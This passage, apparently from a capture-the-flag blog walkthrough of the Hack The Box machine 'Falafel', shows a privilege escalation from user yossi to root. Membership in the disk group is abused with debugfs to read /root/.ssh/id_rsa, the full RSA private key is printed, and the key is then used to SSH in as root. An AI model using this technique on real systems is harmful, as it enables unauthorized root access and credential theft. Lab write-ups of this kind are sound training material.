Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Expanded Security Maintenance for Infrastructure is not enabled.

159 updates can be applied immediately.
51 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Mar  7 08:14:46 2025
yossi@falafel:~$ id
uid=1000(yossi) gid=1000(yossi) groups=1000(yossi),4(adm),6(disk),24(cdrom),30(dip),46(plugdev),117(lpadmin),118(sambashare)
yossi@falafel:~$ whoami
yossi
```

Now I have `yossi`'s shell!



# Shell as `root`

### Enumeration

Let's check `yossi`'s group membership again.

```bash
yossi@falafel:~$ groups
yossi adm disk cdrom dip plugdev lpadmin sambashare
```

Among the groups, `disk` group is listed on the same [article](https://book.hacktricks.wiki/ko/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#disk-group) as `video`.
According to the article, this membership allows user to access all data on the machine like `root`.

### Privesc via `disk` group membership

First, let's check where `/` located : `/dev/sda1`

```bash
yossi@falafel:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            460M     0  460M   0% /dev
tmpfs            99M  8.0M   91M   9% /run
/dev/sda1       3.4G  2.5G  806M  76% /
tmpfs           493M  7.2M  486M   2% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           493M     0  493M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/1000
tmpfs            99M     0   99M   0% /run/user/1001
```

Then, using `debugfs`, I can access to `/root/.ssh/id_rsa`.

```bahs
yossi@falafel:~$ debugfs /dev/sda1
debugfs 1.44.1 (24-Mar-2018)
debugfs:  cd /root
debugfs:  ls
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyPdlQuyVr/L4xXiDVK8lTn88k4zVEEfiRVQ1AWxQPOHY7q0h
b+Zd6WPVczObUnC+TaElpDXhf3gjLvjXvn7qGuZekNdB1aoWt5IKT90yz9vUx/gf
v22+b8XdCdzyXpJW0fAmEN+m5DAETxHDzPdNfpswwYpDX0gqLCZIuMC7Z8D8Wpkg
BWQ5RfpdFDWvIexRDfwj/Dx+tiIPGcYtkpQ/UihaDgF0gwj912Zc1N5+0sILX/Qd
UQ+ZywP/qj1FI+ki/kJcYsW/5JZcG20xS0QgNvUBGpr+MGh2urh4angLcqu5b/ZV
dmoHaOx/UOrNywkp486/SQtn30Er7SlM29/8PQIDAQABAoIBAQCGd5qmw/yIZU/1
eWSOpj6VHmee5q2tnhuVffmVgS7S/d8UHH3yDLcrseQhmBdGey+qa7fu/ypqCy2n
gVOCIBNuelQuIAnp+EwI+kuyEnSsRhBC2RANG1ZAHal/rvnxM4OqJ0ChK7TUnBhV
+7IClDqjCx39chEQUQ3+yoMAM91xVqztgWvl85Hh22IQgFnIu/ghav8Iqps/tuZ0
/YE1+vOouJPD894UEUH5+Bj+EvBJ8+pyXUCt7FQiidWQbSlfNLUWNdlBpwabk6Td
OnO+rf/vtYg+RQC+Y7zUpyLONYP+9S6WvJ/lqszXrYKRtlQg+8Pf7yhcOz/n7G08
kta/3DH1AoGBAO0itIeAiaeXTw5dmdza5xIDsx/c3DU+yi+6hDnV1KMTe3zK/yjG
UBLnBo6FpAJr0w0XNALbnm2RToX7OfqpVeQsAsHZTSfmo4fbQMY7nWMvSuXZV3lG
ahkTSKUnpk2/EVRQriFjlXuvBoBh0qLVhZIKqZBaavU6iaplPVz72VvLAoGBANj0
GcJ34ozu/XuhlXNVlm5ZQqHxHkiZrOU9aM7umQkGeM9vNFOwWYl6l9g4qMq7ArMr
5SmT+XoWQtK9dSHVNXr4XWRaH6aow/oazY05W/BgXRMxolVSHdNE23xuX9dlwMPB
f/y3ZeVpbREroPOx9rZpYiE76W1gZ67H6TV0HJcXAoGBAOdgCnd/8lAkcY2ZxIva
xsUr+PWo4O/O8SY6vdNUkWIAm2e7BdX6EZ0v75TWTp3SKR5HuobjVKSht9VAuGSc
HuNAEfykkwTQpFTlmEETX9CsD09PjmsVSmZnC2Wh10FaoYT8J7sKWItSzmwrhoM9
BVPmtWXU4zGdST+KAqKcVYubAoGAHR5GBs/IXFoHM3ywblZiZlUcmFegVOYrSmk/
k+Z6K7fupwip4UGeAtGtZ5vTK8KFzj5p93ag2T37ogVDn1LaZrLG9h0Sem/UPdEz
HW1BZbXJSDY1L3ZiAmUPgFfgDSze/mcOIoEK8AuCU/ejFpIgJsNmJEfCQKfbwp2a
M05uN+kCgYBq8iNfzNHK3qY+iaQNISQ657Qz0sPoMrzQ6gAmTNjNfWpU8tEHqrCP
NZTQDYCA31J/gKIl2BT8+ywQL50avvbxcXZEsy14ExVnaTpPQ9m2INlxz97YLxjZ
FEUbkAlzcvN/S3LJiFbnkQ7uJ0nPj4oPw1XBcmsQoBwPFOcCEvHSrg==
-----END RSA PRIVATE KEY-----
```

Using this RSA private key, let's open a ssh shell.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ ssh -i root.priv root@10.10.10.73
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Expanded Security Maintenance for Infrastructure is not enabled.

159 updates can be applied immediately.
51 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue May  1 20:14:09 2018 from 10.10.14.4
root@falafel:~# id
uid=0(root) gid=0(root) groups=0(root)
root@falafel:~# whoami
root
```

I got a `root` shell!